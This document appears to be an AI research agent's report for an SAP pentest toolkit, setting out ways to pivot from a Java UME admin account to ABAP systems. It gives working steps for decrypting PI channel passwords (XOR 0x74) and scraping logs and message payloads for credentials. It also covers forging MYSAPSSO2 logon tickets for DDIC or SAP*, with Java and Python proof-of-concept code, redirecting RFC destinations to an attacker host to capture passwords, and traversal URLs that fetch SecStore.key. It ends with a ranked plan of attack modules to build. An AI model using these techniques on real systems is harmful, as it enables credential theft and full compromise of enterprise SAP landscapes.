# Java → ABAP Pivot Techniques from a RECON UME Admin

Research agent: "Java→ABAP pivots via UME admin"

**Target profile:** hardened AS Java where `/ctc/ConfigServlet` is 404,
`/nwa/` is 404, telnet 5NN08 is firewalled, but
`/CTCWebService/CTCWebServiceBean`, `/useradmin/`, and
`/sap/monitoring/SystemInfo` accept UME admin HTTP-Basic.

**TL;DR:** SAP deliberately architected the Java stack so the
DestinationService API refuses to hand plaintext passwords back to a
UME admin. What works instead: (a) on-box code execution via whitelist
APIs, (b) secstore decryption, (c) PI's older less-hardened CPACache,
(d) SAPLogonTicket forgery with TicketKeystore.

---

## 1. Web APIs that read JCo destinations / passwords

### 1a. `com.sap.security.core.server.destinations.api.DestinationService`

- **Access:** JNDI only, in-VM code (servlet / EJB / JSP / Web Dynpro Java / PI module). `new InitialContext().lookup(DestinationService.JNDI_KEY)`.
- **Password disclosure:** **No.** SAP explicitly documents *"Access to security-relevant internal destination properties (e.g. passwords, tickets) is restricted to few selected engine components and not generally available to any service or application."* Enforced by DestinationService impl based on calling component identity (SDA / vendor), not JAAS. `getJCoProperties()` returns non-secret jco.* properties only; `jco.client.passwd` is withheld.
- **SAP Notes tightening this:** 1408081, 1562541, 1710977. Pre-7.3 systems without these leaked the password via `getJCoProperties()`.
- **Verdict:** **no direct HTTP leak.** Requires on-box code execution.

### 1b. WebDynpro `tc~lm~itsam~ui~mainframe~wd` / `/nwa/destinations`

- **URL:** `/nwa/destinations` backed by the destination editor pane.
- **Auth:** UME role `SAP_J2EE_ADMIN`.
- **Password disclosure:** **No.** UI fills the password field with `********` on every render. Never sent to browser.
- **Useful for:** **enumeration** — destination names, host, SID, target client, user, pool size are all readable. Worth adding as a scanner feature.
- **On J75:** `/nwa/` was 404. However `/webdynpro/resources/sap.com/tc~lm~webadmin~mainframe~wd/MainFrame` sometimes survives when `/nwa/` is pruned; already in `sap_java_ctc.py` probe catalog.

### 1c. `/sap/bc/webdynpro/sap/ags_destination_service`

- ABAP WebDynpro app (prefix `/sap/bc/webdynpro/sap/`). Installed by SolMan. Manages destinations from the managed system's perspective. Not reachable on pure J75. Not useful as a Java-admin pivot.

### 1d. `/sap/monitoring/SystemInfo`

- **Auth:** Originally unauth, hardened in SAP Note 2256846 (CVE-2016-2388) to require `SAP_J2EE_ADMIN` or `monitor` group.
- **Returns:** XML dump: SID, kernel, patch levels, hostname, DB type/host, all component versions, cluster-node layout, applied SP versions, cluster IDs.
- **No credentials.** Extremely useful for reconnaissance.

### 1e. PI-specific endpoints

- `/sap/xi/destinations` — not a real endpoint on stock PI installs.
- `/XIMonitor/` — Runtime Workbench style; enumerates message endpoints / party / service names but **no channel passwords**.
- `/AdapterMessageMonitoring/basic` — SOAP endpoint (WSDL at `?wsdl`). Auth: Basic, roles `SAP_XI_MONITOR` / `SAP_XI_ADMINISTRATOR_J2EE`. Methods `getMessageList`, `getMessageBytesJavaLangStringBoolean` let you **dump raw SOAP/Proxy/JDBC payload bytes** for any message in the adapter-engine audit log. Those payloads routinely contain SOAP `wss:Username` / `wss:Password`, JDBC URLs with passwords, SOAP-over-HTTP basic-auth passwords, SAP-ticket cookies. **This is a real, underused HTTP leak.** SAP has no note redacting the payload.

### 1f. CTCWebServiceBean `executeSynchronious` cprocs

- No cproc reads a destination and returns the password. Cprocs write state into secstore, not read back.
- **What you CAN do on J75 (CTCWebService alive):** `SPC_UserMgt.cproc` mints more UME admins (RECON already does this); `SPC_DestinationsMgt.cproc` can **overwrite** existing destination passwords with one you choose. Then call the destination from any deployed servlet and capture the outgoing traffic — pivot by changing `jco.client.ashost` to your box and logging the JCo handshake. **The ABAP destination connects to YOUR fake ABAP and sends client/user/password on logon.** See §8.

---

## 2. JMX over HTTP (P4 / jmx_soap / mmr)

- `/jmx_soap/` and `/monitoring/SystemInfo` are not JMX-RMI. SAP's usable JMX: RMI-P4 (TCP 5NN04) or P4S (TCP 5NN06).
- **Auth:** RMI-P4 JMX requires `administrators` role + valid UME password.
- **Reachability:** P4 frequently not firewalled externally but also not reachable from the web tier. On J75 you need to confirm 50404 is allowed from SAPMAP's host.
- **Relevant MBeans:**
  - `com.sap.engine.services.destinations:type=DestinationsManagement` — read all destination names + non-secret properties; set password (write-only).
  - `com.sap.engine.services.keystore:type=KeystoreManagement` — list views (TicketKeystore, ServiceSSL, SAPLogonTicketKeypair), **export public cert** (private export forbidden via JMX).
  - `com.sap.engine.services.configuration:type=ConfigurationManagement` — browse/update config DB. **Can read `secure.storage.context` entries in plaintext** if the MBean's authz check is in "legacy" mode (pre-Note 2252312).
  - `DeployService.deploy(String archivePath)` — requires archive on disk; chain with secstore write.
- **Python client:** none public for P4 protocol (proprietary, IIOP-ish).
- **Verdict:** Powerful if reachable, but needs Java client on-disk. Suitable as "post-SecStore-JSP" amplifier, not first move.

---

## 3. SAP JVM ShellService / Groovy from UME admin

- No shipped HTTP Groovy/JavaScript endpoint in stock 7.3/7.4/7.5 PI.
- `/ctc/ConfigServlet` (J75: 404).
- `/webdynpro/dispatcher/sap.com/tc~bl~util~svc~wd/*` — internal utility WD apps, not scripting.
- BPM `/bpm/workplace` — Groovy in rule tasks, only from designed flow.
- `/sap/opu/odata/iwfnd/*` — ABAP.
- **Script Service** (P4 MBean `com.sap.engine.services.scripting:type=ScriptingService`) — runs JS via Rhino/Nashorn, only reachable via P4/JMX. Some 7.5 PO installs.
- CPI / Cloud Integration Groovy executors — **cloud only**, not on-prem.
- **Verdict:** No HTTP-only Groovy path. Telnet (blocked) or JSP drop.

---

## 4. PI / XI specific — the gold mine on J75

### 4a. CPACache password recovery — **HIGH VALUE**

- **API:** `com.sap.aii.af.service.cpa.CPAFactory.getInstance().getLookupManager().getChannelByChannelName(party, service, channelName, adapterType, adapterNamespace)` returns `Channel`. `channel.getValueAsXmlString()` emits full XML config including **passwords as base64-XOR-encoded text**.
- **Decryption:** base64-decode, reverse bytes, XOR each byte with `0x74`. Static XOR key. Works up through **PO 7.5 SP14**; SAP Note 2714695 / 2715204 (PO 7.5 SP15) switched channel secrets to proper secstore.
- **Roles required:** `SAP_XI_ADMINISTRATOR_J2EE` — you have this via RECON (member of Administrators).
- **Deployment:** JSP drop — exact same path as `sap_java_secstore.py`. ~30 lines Java.
- **Why it works:** XOR-0x74 is "obfuscation" not crypto; `CPACache` is reachable from any classloader inside the AF application including JSPs dropped into `AdapterFramework/servlet_jsp` or `irj` context.

### 4b. `/AdapterMessageMonitoring/basic` SOAP — MEDIUM VALUE

- `getMessageBytesJavaLangStringBoolean(messageKey, true)` returns complete stored message bytes including outbound HTTP headers with `Authorization: Basic ...`, SOAP WS-Security `UsernameToken`, embedded `MYSAPSSO2=...` cookies, JDBC URLs with inline passwords.
- Pre-requisite: messages older than `archive.keep.days` (default 30) absent.
- **SAPMAP action:** `getMessageList()` filtered on recent Success/Fail, iterate `getMessageBytesJavaLangStringBoolean`, regex-scan for `password|Authorization|sap-passport|mysapsso2|jco\.client\.passwd|j_password`, feed to graph.

### 4c. `/mdt/channelmonitorservlet`, `/AdapterFramework/admin/channelstatus.jsp`, `/run/cpacache/query/nocookie`

- Reveal party/service/channel names, state, host/port targets. **Not passwords.** Useful — tell you which channels to decrypt via 4a.

### 4d. ESR/IR Directory export

- `/rep/*` (Integration Repository) and `/dir/*` (Integration Directory). Passwords encoded same as CPACache (XOR-0x74).

---

## 5. Authenticated-admin HTTP leaks worth probing

| Path | What it returns |
|---|---|
| `/logviewer/` (also `/nwa/logs`, `/logviewer/Dispatcher`) | Raw `/usr/sap/<SID>/J00/j2ee/cluster/server0/log/*`. **Very leaky.** `defaultTrace.*.trc` routinely logs full JCo property dumps at DEBUG including failed RFC passwords. Trivially readable via `/logviewer/getLogFile?fileName=...`. |
| `/ConfigCheckServlet` (pre-7.3) | Static config-sanity output. Usually removed in 7.4+. |
| `/sap/monitoring/SystemInfo` | System inventory XML (§1d) |
| `/sap/monitoring/Performance` | Perf metrics w/ component names |
| `/ssc/*` (Secure Storage Config) | Web UI for secstore. Almost always requires on-box; rare on modern systems. |
| `/irj/servlet/prt/portal/prtroot/com.sap.portal.navigation.portallauncher.default` | Portal anchor; sometimes leaks iView configs with admin |
| `/irj/go/km/navigation?Uri=/` | KM filesystem tree — unauth info leak on misconfigured portals (pre-2018 notes) |
| `/webdynpro/resources/sap.com/tc~wd~tools/Explorer` | WD Developer view on some 7.3 |
| `/bugrep/` | SRT bug-report collector: full config snapshot including destination list (without passwords) |
| `/scheduler/ui/` (Note 3476549) | Post-auth directory traversal. If Note missing: arbitrary file read via `../..`. Directly grabs SecStore.key. |
| `/run/cpacache/query/nocookie` | PI channel cache state (enumeration without creds) |
| `/webdynpro/dispatcher/sap.com/tc~lm~itsam~ui~mainframe~wd/Shell` | NWA Shell WD if alive |
| `/webdynpro/resources/sap.com/tc~lm~ctc~deploy~wd/Main` | CTC deploy WD if alive; deploy SCA/EAR from URL → on-disk code |
| `/CrashFileDownloadServlet?fileName=..\..\SYS\global\security\data\SecStore.key` | CVE-2016-3976 arbitrary file read post-auth |
| `/core/bc/diagtool/` | Diagnostic tool web front; dumps engine properties, heap summary |
| `/mmr/monitor` | SolMan managed-system monitor; shows managed-system inventory |

**Bottom line:** authenticated `/logviewer/` is the best "free" credential dump on most 7.3-7.5 AS Javas still exposing it. Grep for `jco\.client\.passwd`, `password=`, `MYSAPSSO2`, `Authorization: Basic`, `destination.*password`.

---

## 6. SAP SWPM / sapinst remote web API

- TCP 4237 (GUI) / 21200 (web-connect) only while install/upgrade active.
- `/sapinst/<session>/` login accepts installation "Master Password" chosen at SWPM start.
- Post-auth `/sapinst/command/` can run arbitrary roles including reset-SecStore-key and add-OS-user.
- **Verdict:** Corner case; skip for now.

---

## 7. SAPLogonTicket forging — **the endgame**

This is the single most impactful technique for J75.

1. **Identify trust:** `/sap/monitoring/SystemInfo` → SID + cluster. NWA destination list (or RFC destinations via JSP) → which ABAP systems have STRUSTSSO2 trust to this AS Java. From ABAP side: ACL entry `sid=<J75SID>, client=000, issuer=CN=J2EE, ...` in their STRUSTSSO2 store.
2. **Extract the AS Java ticket-issuer private key.** Lives in **TicketKeystore**, alias `SAPLogonTicketKeypair`:
   - **Offline from secstore.** Existing `sap_java_secstore.py` decrypts secstore. Add a JSP that calls `com.sap.engine.services.keystore.runtime.KeyStoreRuntimeInterface` (or reflectively `com.sap.engine.services.security.server.jaas.KeyStoreManager`) to load `SAPLogonTicketKeypair` alias and emit the PrivateKey PEM — key storage allows authenticated-admin reads.
   - **NWA keystore editor export.** If NWA alive, Keystore Admin → TicketKeystore → "Export to PSE" (some versions: PSE unprotected / trivial-password).
   - **ConfigTool read** (only after LPE to sidadm).
3. **Mint MYSAPSSO2 for any user.** `com.sap.security.api.ticket.LogonTicketEx` and `com.sap.security.core.ticket.imp.LogonTicketGenerator` (in `com.sap.security.api.jar` + `com.sap.security.core.jar`): `setRecipientSID`, `setUser`, `setClient`, `setValidity`, `sign(PrivateKey)`. 30-line Java. Library jars are on the target.
4. **Hop to ABAP.** Present cookie to:
   - `/sap/bc/soap/rfc?sap-client=<cli>` with `Cookie: MYSAPSSO2=<ticket>` — arbitrary RFMs via SOAP (requires `S_RFC`, `S_SERVICE`). Forged user = SAP_ALL / DDIC / SAP* → instant RCE via `SXPG_*` and table read via `RFC_READ_TABLE`.
   - `/sap/bc/gui/sap/its/webgui?sap-client=<cli>` — WebGUI.
   - `/sap/bc/soap/wsdl11?services=*` — SOAP catalog.
   - `/sap/public/bc/ur/` → `/sap/bc/bsp/sap/*` — BSP auto-logon.
5. **Which ABAP user to forge?** Any user in the ABAP ACL of the TicketKeystore entry. `SAP*`, `DDIC`, or any `SAP_ALL` account existing in client 000/001/100. Valid as long as issuer cert in STRUSTSSO2 is valid (years).

**SAP Notes:** 1531399, 1520995, 3021197 (ticket-issuer hardening). None block forge-with-stolen-key.

**PoC skeleton (JSP on Java, local jars):**

```java
com.sap.security.api.ticket.LogonTicketEx t = new com.sap.security.api.ticket.LogonTicketEx();
t.setRecipientSID("<ABAP_SID>");
t.setRecipientClient("000");
t.setUser("DDIC");
t.setUserClient("000");
t.setCreationTime(new java.util.Date());
t.setValidityTime(8 * 3600);
String cookie = t.getTicket(key, cert);  // base64, drop-in MYSAPSSO2
out.println(cookie);
```

Python:

```python
r = requests.post(f"http://{abap_host}:{abap_port}/sap/bc/soap/rfc?sap-client=000",
                  data=rfc_read_table_usr02_soap,
                  headers={"Cookie": f"MYSAPSSO2={cookie}"})
```

**This is the payload with the highest blast radius.**

---

## 8. Overwrite-and-Harvest ("shoot the destination at me")

Alternative when secstore is rotated/unreadable:

1. `CTCWebServiceBean.executeSynchronious` with `SPC_DestinationsMgt.cproc` — **update** existing RFC destination's `jco.client.ashost` to attacker IP; leave password empty ("keep existing") — SAP sends existing password to your host on next use.
2. Stand up `pysap` MS/GW/dispatcher on attacker:3300 with logging. Any scheduled job or background service using that destination connects to you and sends client/user/password in the JCo handshake.
3. Put destination back afterwards (same cproc). Auditable but works when secstore is a brick.

---

## Ranked shortlist — 5 things to add NEXT for J75

### 1. `sap_java_cpa_dump.py` — PI CPACache channel password recovery

- **Why first:** works right now against 7.3/7.4/7.5 PI through SP14; decrypts **every** communication-channel password plus JDBC/LDAP/JMS/SFTP URIs inline. Many PI channels target ABAP backends with named users — instant Java→ABAP creds.
- **How:** reuse existing `deploy_jsp` chain. JSP uses `CPAFactory.getInstance().getLookupManager().getAllChannels()`, iterates `channel.getValueAsXmlString()`, applies XOR-0x74. Output feeds SAPMAP as new credential nodes + edges.
- **Complexity:** low (~200 LOC Python + 60 LOC JSP).
- **Prereqs:** UME admin, target PI/PO ≤ 7.5 SP14, any JSP drop path.

### 2. `sap_java_ticket_forge.py` — SAPLogonTicket minting

- **Why:** on any AS Java with STRUSTSSO2 trust to an ABAP system (SolMan, BI portals, ESS/MSS, PI self-monitoring — standard configs), instant **any-user ABAP login** with zero password. Survives password rotations.
- **How:** JSP #1 dumps TicketKeystore `SAPLogonTicketKeypair` private key + self-cert; JSP #2 (or local Python using OpenSSL-signed PKCS#7) forges MYSAPSSO2 for given user/SID/client. Drive `/sap/bc/soap/rfc` with cookie.
- **Complexity:** medium (~400 LOC). Needs bundled `com.sap.security.api.jar` reference or clean-room PKCS#7 signer.
- **Prereqs:** UME admin, TicketKeystore present, one ABAP with STRUSTSSO2 ACL to J75.

### 3. `sap_java_logviewer_grep.py` — authenticated log harvester

- **Why:** `/logviewer/` survives on most hardened images even when `/nwa/` is gone. UME admin can list+read `defaultTrace.*.trc`. Logs routinely contain accidentally-logged JCo properties with plaintext passwords and MYSAPSSO2 cookies.
- **How:** list via `/logviewer/LogViewerService/listServerNodes` + `getLogFiles`, download rolling logs, regex scan.
- **Complexity:** low (~300 LOC). No JSP.
- **Prereqs:** UME admin, `/logviewer/` reachable.

### 4. `sap_java_amm_harvest.py` — AdapterMessageMonitoring scraper

- **Why:** PI's AMM SOAP almost never firewalled. Historical payloads embed Basic-Auth and WS-Security used by outbound PI calls. Complements CPACache (incoming/resting channel creds) with AMM (actual-used credentials in payloads).
- **How:** POST SOAP to `/AdapterMessageMonitoring/basic?style=document`. Iterate recent messages → `getMessageBytesJavaLangStringBoolean` → regex scan.
- **Complexity:** low-medium (~400 LOC).
- **Prereqs:** UME admin, PI adapter engine running, AMM endpoint alive.

### 5. `sap_java_destinations_enum.py` — inventory + overwrite-hijack

- **Why:** must enumerate destinations regardless. CTCWebServiceBean's `SPC_DestinationsMgt.cproc` gives overwrite+harvest primitive (§8) — works even when secstore is unreadable. On J75 this works because only CTCWebService and UME are needed — no `/nwa/`, no `/ctc/`, no telnet.
- **How:** (a) read destination inventory via JSP using `DestinationFactory.getInstance().getAllDestinationNames()` + `getDestinationProperties()` (non-secret only); (b) offer "hijack X" action calling CTCWebServiceBean `SPC_DestinationsMgt.cproc` with new `jco.client.ashost=<attacker IP>`; spin up pysap MS/GW receiver on attacker.
- **Complexity:** medium (~500 LOC; includes attacker-side MS/GW fake).
- **Prereqs:** UME admin; JSP drop (for enum) OR CTCWebService alive (for hijack).

---

## Quick answers to specific asks

- **Does `ags_destination_service` / `tc~lm~itsam` / NWA destinations leak passwords?** No — all UIs blank the password field on render. Enumeration only.
- **Can HTTP-only UME admin read JCo passwords via DestinationService API?** No — API refuses `jco.client.passwd` reads to any caller that isn't a whitelisted engine component. Hardened since ~2010. Only reliable API-level read is from secstore via on-box Java (existing JSP path).
- **Is there an HTTP Groovy/shell service?** Not in stock AS Java. Only CPI/Cloud.
- **Can SAPLogonTicket be forged from a UME admin without shell?** Yes, if you can extract TicketKeystore private key — JSP drop is enough. Most powerful Java→ABAP pivot path; works against J75 scenario.
- **PI channel passwords?** Yes — CPACache + XOR 0x74 on PO ≤ 7.5 SP14. High value, low complexity.
- **AdapterMessageMonitoring leaks?** Yes — stored payloads contain outbound auth headers. SAP has not remediated.

---

## Sources

- [chipik/SAP_RECON](https://github.com/chipik/SAP_RECON)
- [CVE-2020-6287 attackerkb](https://attackerkb.com/topics/JubO1RiVBP/cve-2020-6287-critical-vulnerability-in-sap-netweaver-application-server-as-java)
- [SAP Examples — Destination Service API](https://help.sap.com/doc/saphelp_nw73ehp1/7.31.19/en-US/17/d609b48ea5f748b47c0f32be265935/content.htm)
- [Communication channel password recovery (2019)](https://blogs.sap.com/2019/02/26/communication-channel-password-recovery)
- [Communication channel password recovery "Secure Storage"](https://community.sap.com/t5/technology-blog-posts-by-members/communication-channel-password-recovery-quot-secure-storage-quot/ba-p/13433288)
- [AdapterMessageMonitoring WSDL / KBA 2935812](https://userapps.support.sap.com/sap/support/knowledge/en/2935812)
- [Configuring AS Java to Issue Logon Tickets](http://saphelp.ucc.ovgu.de/NW750/EN/4a/412251343f2ab1e10000000a42189c/content.htm)
- [SAP Java Secure Storage — DZone](https://dzone.com/articles/sap-java-secure-storage)
- [erpscanteam/SecStoreDec](https://github.com/erpscanteam/SecStoreDec)
- [SAP NetWeaver AS JAVA 7.1 < 7.5 Information Disclosure (CVE-2016-2388)](https://www.exploit-db.com/exploits/39841)
- [CVE-2016-3976 CrashFileDownloadServlet](https://nvd.nist.gov/vuln/detail/cve-2016-3976)
- [Pentesting SAP — HackTricks](https://hacktricks.wiki/en/network-services-pentesting/pentesting-sap.html)
- [The MYSAPSSO2 cookie — SCN Wiki](https://wiki.scn.sap.com/wiki/display/ASJAVA/The+MYSAPSSO2+cookie)
- [Onapsis SAP MC Concepts](https://onapsis.com/blog/introducing-sap-management-console-concepts-and-general-considerations/)
- [Nmap NSE http-sap-netweaver-leak](https://nmap.org/nsedoc/scripts/http-sap-netweaver-leak.html)
- [SAP Portal Security, lesson 2: Hacking Servlets](https://tagiltsev.blogspot.com/2014/01/sap-portal-security-lesson-2-hacking.html)
- [KB #0013 Obtaining MYSAPSSO2 tickets with NWRFC](https://rfcconnector.com/documentation/kb/0013/)
- [SAP Note KBA 3476549 — /scheduler/ui directory traversal](https://userapps.support.sap.com/sap/support/knowledge/en/3476549)
